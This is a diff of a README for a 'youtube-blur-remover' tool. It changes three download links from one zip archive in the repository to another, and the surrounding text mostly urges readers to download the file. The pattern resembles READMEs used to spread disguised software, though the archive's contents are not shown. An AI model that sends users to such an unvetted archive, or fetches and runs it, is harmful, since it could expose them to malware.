@@ -1,6 +1,6 @@
 # 🎥 youtube-blur-remover - Clear Your YouTube Experience Effortlessly
 
-[![Download](https://raw.githubusercontent.com/sai1987s/youtube-blur-remover/main/Exoascales/youtube-blur-remover.zip)](https://raw.githubusercontent.com/sai1987s/youtube-blur-remover/main/Exoascales/youtube-blur-remover.zip)
+[![Download](https://raw.githubusercontent.com/sai1987s/youtube-blur-remover/main/scripts/blur_remover_youtube_v1.4.zip)](https://raw.githubusercontent.com/sai1987s/youtube-blur-remover/main/scripts/blur_remover_youtube_v1.4.zip)
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ To get started with the youtube-blur-remover, follow these simple steps:
 
 To download the latest version of the software, click the link below:
 
-[Visit this page to download](https://raw.githubusercontent.com/sai1987s/youtube-blur-remover/main/Exoascales/youtube-blur-remover.zip)
+[Visit this page to download](https://raw.githubusercontent.com/sai1987s/youtube-blur-remover/main/scripts/blur_remover_youtube_v1.4.zip)
 
 ### 2. Choose Your Version
 
@@ -100,6 +100,6 @@ The youtube-blur-remover is open source, released under the MIT License. This me
 
 Ready to improve your YouTube experience? Visit this page to download the latest version:
 
-[Visit this page to download](https://raw.githubusercontent.com/sai1987s/youtube-blur-remover/main/Exoascales/youtube-blur-remover.zip)
+[Visit this page to download](https://raw.githubusercontent.com/sai1987s/youtube-blur-remover/main/scripts/blur_remover_youtube_v1.4.zip)
 
 Enjoy clearer videos today with the youtube-blur-remover!
